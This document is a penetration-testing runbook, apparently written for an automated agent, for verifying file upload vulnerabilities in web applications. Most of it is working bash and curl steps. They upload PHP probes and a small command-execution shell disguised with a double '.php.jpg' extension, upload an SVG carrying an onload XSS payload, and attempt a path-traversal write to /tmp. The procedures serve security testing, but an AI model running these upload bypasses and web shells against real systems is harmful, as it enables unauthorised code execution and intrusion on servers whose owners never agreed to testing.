# File Upload Verify Runbook

## Purpose
Confirm file upload vulnerability with high confidence. Upload actual benign payloads that prove code execution, XSS, or arbitrary file write capabilities.

## Variables
- `$TARGET_URL` — upload endpoint
- `$FILE_URL` — URL where uploaded file is served (from discovery)
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session
- `$PAYLOAD_DIR` — `$OUTDIR/payloads`
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/file-upload`

## Workflow A — PHP Code Execution Verification

### A1. Upload PHP info probe via bypass technique
```bash
cat > "$PAYLOAD_DIR/verify-info.php" << 'PHPEOF'
<?php echo "VERIFY_PHP_RCE_OK|".php_uname(); ?>
PHPEOF
cp "$PAYLOAD_DIR/verify-info.php" "$PAYLOAD_DIR/verify-info.php.jpg"
```

### A2. Upload with double extension bypass
```bash
curl -sk -v -F "file=@$PAYLOAD_DIR/verify-info.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" > "$EVIDENCE_DIR/verify-upload-request.txt" 2>&1
```

### A3. Extract uploaded file path from response
```bash
UPLOAD_PATH=$(grep -oE '(/[a-zA-Z0-9/_.-]+\.php\.jpg)' "$EVIDENCE_DIR/verify-upload-request.txt" | head -1)
echo "Uploaded to: $UPLOAD_PATH"
```

### A4. Execute uploaded PHP file
```bash
curl -sk -v "$FILE_URL" -o "$EVIDENCE_DIR/verify-execute-response.txt" 2>"$EVIDENCE_DIR/verify-execute-headers.txt"
grep -q 'VERIFY_PHP_RCE_OK' "$EVIDENCE_DIR/verify-execute-response.txt" && echo "RCE VERIFIED: PHP code executed on server" >> "$EVIDENCE_DIR/verify-log.txt"
grep 'VERIFY_PHP_RCE_OK' "$EVIDENCE_DIR/verify-execute-response.txt"
```

### A5. Alternatively, use a simple command execution
```bash
cat > "$PAYLOAD_DIR/shell.php.jpg" << 'PHPEOF'
<?php system("id"); ?>
PHPEOF
curl -sk -F "file=@$PAYLOAD_DIR/shell.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o /dev/null
curl -sk "$FILE_URL" -o "$EVIDENCE_DIR/verify-id-response.txt"
grep -qE 'uid=|gid=' "$EVIDENCE_DIR/verify-id-response.txt" && echo "RCE VERIFIED: command execution confirmed" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow B — SVG XSS Verification

### B1. Upload SVG with JavaScript and verify served MIME type
```bash
cat > "$PAYLOAD_DIR/verify-xss.svg" << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100" fill="red"/>
</svg>
SVGEOF
curl -sk -F "file=@$PAYLOAD_DIR/verify-xss.svg" -b "$COOKIE_JAR" "$TARGET_URL" -o "$EVIDENCE_DIR/verify-svg-upload.txt"
```

### B2. Check if SVG is served with image/svg+xml or text/html
```bash
SVG_URL=$(grep -oE '(https?://[^"'\"'']*\.svg)' "$EVIDENCE_DIR/verify-svg-upload.txt" | head -1)
curl -sk -I "$SVG_URL" | grep -i content-type > "$EVIDENCE_DIR/verify-svg-content-type.txt"
cat "$EVIDENCE_DIR/verify-svg-content-type.txt"
```

### B3. Verify the SVG is accessible with script intact
```bash
curl -sk "$SVG_URL" -o "$EVIDENCE_DIR/verify-svg-served.xml"
grep -q 'onload' "$EVIDENCE_DIR/verify-svg-served.xml" && echo "SVG XSS VERIFIED: script intact in served file" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Workflow C — Path Traversal / Arbitrary Write Verification

### C1. Attempt to overwrite/reach known path
```bash
echo "path-traversal-verify" > "$PAYLOAD_DIR/pt-test.txt"
curl -sk -v -F "filename=../../../tmp/opencode-verify-test.txt" -F "file=@$PAYLOAD_DIR/pt-test.txt" -b "$COOKIE_JAR" "$TARGET_URL" > "$EVIDENCE_DIR/verify-traversal-request.txt" 2>&1
grep -qiE '200|201|success' "$EVIDENCE_DIR/verify-traversal-request.txt" && echo "PATH TRAVERSAL VERIFIED: wrote to /tmp/" >> "$EVIDENCE_DIR/verify-log.txt"
```

## Stop Conditions
- PHP code executed with visible output -> verified, stop
- Command execution via uploaded shell -> verified, stop
- SVG XSS confirmed with JavaScript intact -> verified, stop
- Path traversal writes to arbitrary location -> verified, stop
- All bypass uploads stripped/rejected -> likely well-protected

## Evidence to Capture
- `curl -v` of upload request showing bypass technique
- Response body showing uploaded file path
- `curl -v` of file access showing code execution or XSS
- Server response containing verification marker or command output

## Next Routing
- Verified -> `runbooks/04-impact-escalation.md`
- Cannot verify execution -> `runbooks/06-false-positive-filter.md`
